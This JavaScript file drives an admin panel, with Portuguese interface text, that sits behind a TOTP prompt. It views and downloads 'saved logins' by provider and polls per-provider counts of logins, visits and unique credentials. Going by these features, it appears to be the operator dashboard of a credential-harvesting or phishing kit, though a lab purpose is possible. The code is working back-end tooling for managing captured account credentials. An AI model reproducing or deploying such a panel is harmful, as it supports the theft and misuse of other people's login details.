"use strict";

(function () {
    var overlay = document.getElementById("login-console");
    var body = document.getElementById("login-console-body");
    var openBtn = document.getElementById("btn-open-console");
    var heroOpenBtn = document.getElementById("btn-open-console-hero");
    var tokens = window.PAINEL_TOKENS || {};

    function escapeHtml(s) {
        var d = document.createElement("div");
        d.textContent = s;
        return d.innerHTML;
    }

    function promptTotp() {
        var code = window.prompt("Código Google Authenticator (6 dígitos) — obrigatório:");
        if (!code || String(code).replace(/\D/g, "").length !== 6) {
            window.alert("Cancelado: código 2FA inválido ou ausente.");
            return null;
        }
        return String(code).replace(/\D/g, "");
    }

    function renderConsoleRows(rows) {
        if (!body) return;
        if (!rows || !rows.length) {
            body.innerHTML = '<div class="console-empty">Nenhum login salvo.</div>';
            return;
        }
        body.innerHTML = rows.map(function (r) {
            var cls = r.color === "yellow" ? "line-yellow" : "line-green";
            if (r.color === "red") cls = "line-yellow";
            return '<div class="console-line ' + cls + '">' + escapeHtml(r.line) + "</div>";
        }).join("");
        body.scrollTop = body.scrollHeight;
    }

    function openConsole() {
        if (!overlay) return;
        var code = promptTotp();
        if (!code) return;

        body.innerHTML = '<div class="console-empty">Validando 2FA…</div>';
        overlay.hidden = false;
        overlay.setAttribute("aria-hidden", "false");
        document.body.classList.add("console-open");

        var fd = new FormData();
        fd.append("panel_action", "console:view");
        fd.append("panel_token", tokens.console || "");
        fd.append("totp_code", code);

        fetch("api_console.php", { method: "POST", body: fd, credentials: "same-origin" })
            .then(function (r) { return r.json(); })
            .then(function (data) {
                if (!data || !data.ok) {
                    closeConsole();
                    window.alert((data && data.error) || "Não foi possível abrir os logins.");
                    return;
                }
                window.LAB_AUDIT = data.entries || [];
                renderConsoleRows(window.LAB_AUDIT);
            })
            .catch(function () {
                closeConsole();
                window.alert("Erro de rede. Logins não exibidos.");
            });
    }

    function closeConsole() {
        if (!overlay) return;
        overlay.hidden = true;
        overlay.setAttribute("aria-hidden", "true");
        document.body.classList.remove("console-open");
    }

    function downloadLogins(provider) {
        var code = promptTotp();
        if (!code) return;

        var form = document.createElement("form");
        form.method = "POST";
        form.action = "download_logins.php";
        form.style.display = "none";

        function add(name, val) {
            var i = document.createElement("input");
            i.type = "hidden";
            i.name = name;
            i.value = val;
            form.appendChild(i);
        }

        add("panel_action", "download:logins");
        add("panel_token", tokens.download || "");
        add("totp_code", code);
        if (provider) add("provider", provider);

        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
    }

    if (openBtn) openBtn.addEventListener("click", openConsole);
    if (heroOpenBtn) heroOpenBtn.addEventListener("click", openConsole);
    document.querySelectorAll("[data-close-console]").forEach(function (el) {
        el.addEventListener("click", closeConsole);
    });
    document.addEventListener("keydown", function (e) {
        if (e.key === "Escape") closeConsole();
    });
    if (location.search.indexOf("console=1") !== -1) openConsole();

    document.querySelectorAll(".btn-download-logins").forEach(function (btn) {
        btn.addEventListener("click", function () {
            downloadLogins(btn.getAttribute("data-provider") || "");
        });
    });

    function attachTotpSubmit(form) {
        form.addEventListener("submit", function (e) {
            var msg = form.getAttribute("data-confirm");
            if (msg && !window.confirm(msg)) {
                e.preventDefault();
                return;
            }
            if (form.getAttribute("data-require-totp") !== "1") {
                return;
            }
            var existing = form.querySelector('input[name="totp_code"]');
            if (existing && String(existing.value || "").replace(/\D/g, "").length === 6) {
                return;
            }
            e.preventDefault();
            var code = promptTotp();
            if (!code) return;
            var inp = existing || document.createElement("input");
            inp.type = "hidden";
            inp.name = "totp_code";
            inp.value = code;
            if (!existing) form.appendChild(inp);
            form.submit();
        });
    }

    document.querySelectorAll("form.panel-action-form, form[data-confirm], form[data-require-totp]").forEach(attachTotpSubmit);

    function pollStats() {
        fetch("api_stats.php", { credentials: "same-origin" })
            .then(function (r) { return r.json(); })
            .then(function (data) {
                if (!data || !data.ok) return;
                var totals = data.totals || {};
                document.querySelectorAll("[data-stat]").forEach(function (el) {
                    var key = el.getAttribute("data-stat");
                    if (totals[key] !== undefined) el.textContent = totals[key];
                });
                var badge = document.getElementById("nav-login-badge");
                if (badge && totals.unique_credentials !== undefined) {
                    badge.textContent = totals.unique_credentials;
                }
                var providers = data.providers || {};
                Object.keys(providers).forEach(function (slug) {
                    var row = providers[slug];
                    var countEl = document.querySelector('[data-provider-count="' + slug + '"]');
                    var todayEl = document.querySelector('[data-provider-logins-today="' + slug + '"]');
                    var visitsEl = document.querySelector('[data-provider-visits="' + slug + '"]');
                    if (countEl) countEl.textContent = row.logins;
                    if (todayEl) todayEl.textContent = row.logins_today;
                    if (visitsEl) visitsEl.textContent = row.visits_today;
                });
            })
            .catch(function () {});
    }

    if (document.getElementById("provider-grid")) {
        pollStats();
        setInterval(pollStats, 20000);
    }
})();
